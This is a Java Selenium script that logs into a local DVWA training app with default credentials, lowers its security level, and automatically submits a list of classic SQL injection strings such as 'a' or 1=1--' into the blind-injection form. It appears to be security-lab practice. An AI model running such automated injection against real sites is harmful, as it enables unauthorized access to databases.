package main.java;

import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.support.ui.Select;
import org.openqa.selenium.chrome.ChromeDriverService;
import org.openqa.selenium.htmlunit.HtmlUnitDriver;
import org.openqa.selenium.remote.service.DriverService;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

public class seleniumTest {

    public static void main (String[] args) {
    	
    System.setProperty("webdriver.chrome.driver", "C:\\Selenium Environment\\chromeDriverNew\\chromeDriver.exe");
    System.setProperty(ChromeDriverService.CHROME_DRIVER_SILENT_OUTPUT_PROPERTY,"true");
    WebDriver driver = new ChromeDriver();
    driver.get("http://localhost/dvwa/vulnerabilities/sqli/");
    driver.findElement(By.className("loginInput")).sendKeys("admin");
    driver.findElement(By.name("password")).sendKeys("password");
    driver.findElement(By.name("Login")).click();
  
    try {
    driver.manage().timeouts().implicitlyWait(1, TimeUnit.SECONDS);
    } catch (Exception e) {
    	e.printStackTrace();
    }
    driver.get("http://localhost/dvwa/security.php");
    Select security = new Select(driver.findElement(By.name("security")));
    security.selectByVisibleText("Low");
    driver.findElement(By.name("seclev_submit")).click();
    
    driver.get("http://localhost/dvwa/vulnerabilities/sqli_blind/");
    
    String[] injections = {"admin'--","admin' #","admin'/*","a' or 1=1--","a' or 1=1/*","a' or 1=1# ","a' or 1=1/*"};
    for (int i = 0; i < injections.length; i++) {
    driver.findElement(By.name("id")).sendKeys(injections[i] + "\n");
    driver.findElement(By.name("Submit")).click();
    driver.manage().timeouts().implicitlyWait(1, TimeUnit.SECONDS);
   }
    String URL = driver.getCurrentUrl();
    System.out.println(URL);
   }
 }
     
